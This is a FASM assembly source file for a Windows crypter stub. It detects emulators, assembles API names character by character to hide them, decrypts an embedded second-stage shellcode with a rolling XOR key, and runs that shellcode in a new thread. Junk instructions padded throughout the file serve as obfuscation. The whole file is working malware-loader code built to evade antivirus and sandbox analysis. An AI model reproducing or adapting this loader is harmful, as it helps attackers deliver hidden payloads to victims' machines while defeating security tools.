format PE GUI 4.0																; --- obfuscation ---
entry start

include 'win32wx.inc'
include 'nt.inc'

section '.text' code readable executable

start:
	stdcall	Main
	invoke	ExitProcess, 0
	ret

; Stage 2 shellcode
; When decrypting, must be written to the very beginning for the position independent shellcode to correctly resolve absolute addresses.
; This works, because Stub.exe and Stage2.exe both have the same image base address.

include 'Stage2Shellcode.inc'

proc Main
	local	String[100]:WORD
	local	Kernel32Handle:DWORD
	local	VirtualProtectPtr:DWORD
	local	OldProtect:DWORD
	local	ThreadParameter:DWORD

	; Detect emulator
																				push	edi
																				pop		edi
	stdcall	DetectEmulator

	; Get module handle of kernel32.dll
																				pushfd
																				push	0xbd068032
																				add		esp, 4
																				popfd
	lea		eax, [String]
	; Load string: kernel32.dll
																				pushfd
																				inc		ecx
																				dec		ecx
																				popfd
																				pushfd
																				push	0xe42299b1
																				add		esp, 4
																				popfd
	mov		ebx, 'a'
																				push	edi
																				pop		edi
	add		bx, 10
																				pushfd
																				xor		ecx, 0x10ed1cc4
																				xor		ecx, 0x10ed1cc4
																				popfd
	mov		word[eax + 0], bx ;k
																				pushfd
																				push	0x12d3b6be
																				add		esp, 4
																				popfd
	sub		bx, 6
																				pushfd
																				xor		edi, 0x71314b7a
																				xor		edi, 0x71314b7a
																				popfd
	mov		word[eax + 2], bx ;e
																				pushfd
																				inc		edx
																				dec		edx
																				popfd
	add		bx, 13
																				push	esi edi
																				pop		edi esi
																				xchg	esi, esi
	mov		word[eax + 4], bx ;r
																				mov		esi, esi
																				xchg	ecx, eax
																				xchg	eax, ecx
	sub		bx, 4
																				pushfd
																				push	eax
																				add		esp, 4
																				popfd
																				mov		edx, edx
	mov		word[eax + 6], bx ;n
																				xchg	eax, eax
	sub		bx, 9
																				push	ebx eax
																				pop		eax ebx
																				push	edx
																				pop		edx
	mov		word[eax + 8], bx ;e
																				xchg	ebx, ebx
																				xchg	edx, ebx
																				xchg	ebx, edx
	add		bx, 7
																				mov		edi, edi
																				pushfd
																				push	ecx
																				add		esp, 4
																				popfd
	mov		word[eax + 10], bx ;l
																				pushfd
																				push	0xe9dae933
																				add		esp, 4
																				popfd
																				pushfd
																				xor		edx, 0x7f0ce65b
																				xor		edx, 0x7f0ce65b
																				popfd
	sub		bx, 57
																				pushfd
																				push	0xa0735829
																				add		esp, 4
																				popfd
	mov		word[eax + 12], bx ;3
																				pushfd
																				xor		esi, 0xa40f00b5
																				xor		esi, 0xa40f00b5
																				popfd
																				pushfd
																				push	ebx
																				add		esp, 4
																				popfd
	dec		bx
																				push	eax ecx
																				pop		ecx eax
																				pushfd
																				push	edi
																				add		esp, 4
																				popfd
	mov		word[eax + 14], bx ;2
																				mov		eax, eax
	sub		bx, 4
																				pushfd
																				xor		esi, 0x7e2509f0
																				xor		esi, 0x7e2509f0
																				popfd
	mov		word[eax + 16], bx ;.
																				xchg	edx, edi
																				xchg	edi, edx
	add		bx, 54
																				pushfd
																				push	ecx
																				add		esp, 4
																				popfd
																				mov		eax, eax
	mov		word[eax + 18], bx ;d
																				pushfd
																				xor		esi, 0x7d7dabd4
																				xor		esi, 0x7d7dabd4
																				popfd
	add		bx, 8
																				push	ebx
																				pop		ebx
	mov		word[eax + 20], bx ;l
																				push	eax ebx
																				pop		ebx eax
	mov		word[eax + 22], bx ;l
																				xchg	eax, edx
																				xchg	edx, eax
																				xchg	edx, edi
																				xchg	edi, edx
	mov		word[eax + 24], 0
																				push	eax ecx
																				pop		ecx eax
																				pushfd
																				push	edi
																				add		esp, 4
																				popfd
	invoke	GetModuleHandleW, eax
																				mov		edi, edi
																				mov		edx, edx
	mov		[Kernel32Handle], eax

	; Get pointer of VirtualProtect
																				pushfd
																				inc		eax
																				dec		eax
																				popfd
	lea		eax, [String]
	; Load string: VirtualProtect
																				mov		ecx, ecx
	mov		ebx, 'a'
																				mov		edx, edx
																				pushfd
																				push	eax
																				add		esp, 4
																				popfd
	sub		bl, 11
																				pushfd
																				push	0x82deb53e
																				add		esp, 4
																				popfd
																				xchg	edx, edx
	mov		byte[eax + 0], bl ;V
																				push	edi
																				pop		edi
																				xchg	esi, esi
	add		bl, 19
																				push	edi
																				pop		edi
																				pushfd
																				inc		eax
																				dec		eax
																				popfd
	mov		byte[eax + 1], bl ;i
																				pushfd
																				inc		ecx
																				dec		ecx
																				popfd
																				xchg	edx, edx
	add		bl, 9
																				pushfd
																				xor		ecx, 0xd6e1b4b6
																				xor		ecx, 0xd6e1b4b6
																				popfd
	mov		byte[eax + 2], bl ;r
																				xchg	ebx, ecx
																				xchg	ecx, ebx
																				xchg	ecx, eax
																				xchg	eax, ecx
	add		bl, 2
																				push	edi ecx
																				pop		ecx edi
	mov		byte[eax + 3], bl ;t
																				xchg	esi, esi
	inc		bl
																				xchg	edi, ebx
																				xchg	ebx, edi
																				pushfd
																				push	edi
																				add		esp, 4
																				popfd
	mov		byte[eax + 4], bl ;u
																				push	edx
																				pop		edx
																				pushfd
																				push	edi
																				add		esp, 4
																				popfd
	sub		bl, 20
																				pushfd
																				push	0xed71ef40
																				add		esp, 4
																				popfd
	mov		byte[eax + 5], bl ;a
																				pushfd
																				inc		esi
																				dec		esi
																				popfd
	add		bl, 11
																				pushfd
																				push	esi
																				add		esp, 4
																				popfd
																				pushfd
																				push	ebx
																				add		esp, 4
																				popfd
	mov		byte[eax + 6], bl ;l
																				pushfd
																				push	esi
																				add		esp, 4
																				popfd
																				pushfd
																				inc		eax
																				dec		eax
																				popfd
	sub		bl, 28
																				xchg	esi, ecx
																				xchg	ecx, esi
	mov		byte[eax + 7], bl ;P
																				pushfd
																				xor		eax, 0xf9552397
																				xor		eax, 0xf9552397
																				popfd
																				push	eax esi
																				pop		esi eax
	add		bl, 34
																				xchg	esi, edi
																				xchg	edi, esi
	mov		byte[eax + 8], bl ;r
																				push	edi
																				pop		edi
	sub		bl, 3
																				xchg	edi, edi
																				pushfd
																				push	0x18744a2a
																				add		esp, 4
																				popfd
	mov		byte[eax + 9], bl ;o
																				push	ebx
																				pop		ebx
																				push	esi edx
																				pop		edx esi
	add		bl, 5
																				xchg	edx, edx
																				pushfd
																				push	0x10da8acd
																				add		esp, 4
																				popfd
	mov		byte[eax + 10], bl ;t
																				push	edi edx
																				pop		edx edi
	sub		bl, 15
																				xchg	ecx, ecx
	mov		byte[eax + 11], bl ;e
																				push	ecx edx
																				pop		edx ecx
																				push	ebx esi
																				pop		esi ebx
	sub		bl, 2
																				pushfd
																				inc		edi
																				dec		edi
																				popfd
																				push	ebx esi
																				pop		esi ebx
	mov		byte[eax + 12], bl ;c
																				xchg	ebx, ebx
	add		bl, 17
																				push	edi
																				pop		edi
																				pushfd
																				inc		edx
																				dec		edx
																				popfd
	mov		byte[eax + 13], bl ;t
																				push	ebx esi
																				pop		esi ebx
																				mov		edi, edi
	mov		byte[eax + 14], 0
																				xchg	edx, esi
																				xchg	esi, edx
	invoke	GetProcAddress, [Kernel32Handle], eax
																				mov		edi, edi
																				pushfd
																				xor		ebx, 0x10290d75
																				xor		ebx, 0x10290d75
																				popfd
	mov		[VirtualProtectPtr], eax

	; Change protection of stage2 to RW
																				pushfd
																				xor		edi, 0xf7ea0518
																				xor		edi, 0xf7ea0518
																				popfd
																				pushfd
																				push	ecx
																				add		esp, 4
																				popfd
	lea		eax, [OldProtect]
																				pushfd
																				inc		edi
																				dec		edi
																				popfd
																				mov		edx, edx
	stdcall	[VirtualProtectPtr], start, Stage2Size, PAGE_READWRITE, eax

	; Decrypt stage2
																				xchg	edx, ecx
																				xchg	ecx, edx
	mov		edi, start
																				xchg	edi, eax
																				xchg	eax, edi
																				push	eax
																				pop		eax
	mov		esi, Stage2Shellcode
																				mov		esi, esi
	mov		ecx, Stage2Size
																				push	eax
																				pop		eax
	mov		edx, Stage2Key
																				pushfd
																				xor		ebx, 0x7b226d79
																				xor		ebx, 0x7b226d79
																				popfd
																				xchg	edi, ebx
																				xchg	ebx, edi
	mov		ebx, Stage2PaddingMask
																				push	edx edi
																				pop		edi edx
	cld
.L_decrypt_stage2:
																				mov		ebx, ebx
	lodsb
																				xchg	eax, eax
	xor		al, dl
																				mov		esi, esi
	stosb
																				mov		esi, esi
	ror		edx, 5
																				mov		edx, edx
	imul	edx, 7
																				mov		ecx, ecx
	test	ebx, 1
																				xchg	esi, esi
	jz		@f
																				mov		ecx, ecx
	add		esi, Stage2PaddingByteCount
																				mov		eax, eax
@@:	ror		ebx, 1
																				xchg	ecx, ecx
	dec		ecx
																				xchg	edi, edi
	test	ecx, ecx
																				xchg	esi, esi
	jnz		.L_decrypt_stage2

	; Change protection of stage2 back to RX
																				push	edi
																				pop		edi
																				pushfd
																				push	0x4c64c87a
																				add		esp, 4
																				popfd
	lea		eax, [OldProtect]
																				push	ecx eax
																				pop		eax ecx
																				pushfd
																				inc		ebx
																				dec		ebx
																				popfd
	stdcall	[VirtualProtectPtr], start, Stage2Size, PAGE_EXECUTE_READ, eax

	; Execute decrypted stage 2 shellcode
																				pushfd
																				inc		ecx
																				dec		ecx
																				popfd
	lea		eax, [ThreadParameter]
																				mov		edx, edx
																				pushfd
																				inc		edx
																				dec		edx
																				popfd
	invoke	CreateThread, NULL, 0, start, eax, 0, NULL
																				push	edx edi
																				pop		edi edx
																				xchg	edi, edi
@@:
																				pushfd
																				push	0xc94d1aee
																				add		esp, 4
																				popfd
																				pushfd
																				inc		ecx
																				dec		ecx
																				popfd
	invoke	Sleep, 1000
																				pushfd
																				xor		eax, 0xfd3f3839
																				xor		eax, 0xfd3f3839
																				popfd
	jmp		@b

.ret:
																				pushfd
																				xor		eax, 0xa6777a2b
																				xor		eax, 0xa6777a2b
																				popfd
	invoke	ExitProcess, 0
																				push	esi edi
																				pop		edi esi
	ret
endp

include 'Emulator.asm'



section '.idata' import data readable writeable
	library \
		kernel32, 'kernel32.dll', \
		shlwapi, 'Shlwapi.dll', \
		msvcrt, 'msvcrt.dll'
	include 'api\kernel32.inc'
	include 'api\shlwapi.inc'
	include 'api\msvcrt.inc'



section '.rsrc' resource data readable
	directory \
		RT_MANIFEST, Manifest, \
		RT_ICON, Icons, \
		RT_GROUP_ICON, GroupIcon
	resource Manifest, \
		1, LANG_NEUTRAL, ManifestData
	resource Icons, \
		1, LANG_NEUTRAL, IconData1
	resource GroupIcon, \
		1, LANG_NEUTRAL, GroupIconData
	icon GroupIconData, \
		IconData1, 'Resources\icon-1.ico'
	resdata ManifestData
		file 'Resources\default.manifest'
	endres
